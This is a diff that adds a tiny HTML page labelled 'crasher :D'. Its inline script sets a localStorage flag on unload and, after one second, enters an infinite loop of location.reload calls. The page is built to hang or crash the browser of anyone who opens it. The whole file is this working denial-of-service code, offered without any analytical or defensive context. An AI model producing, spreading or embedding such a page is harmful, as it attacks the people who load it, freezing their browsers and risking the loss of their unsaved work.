@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CR</title>
+</head>
+<body>
+    <h1>Hey!</h1>
+    <h2>crasher :D</h2>
+    <script>
+        onbeforeunload = function(){localStorage.x=1};
+
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000)
+    </script>
+</body>
+</html>
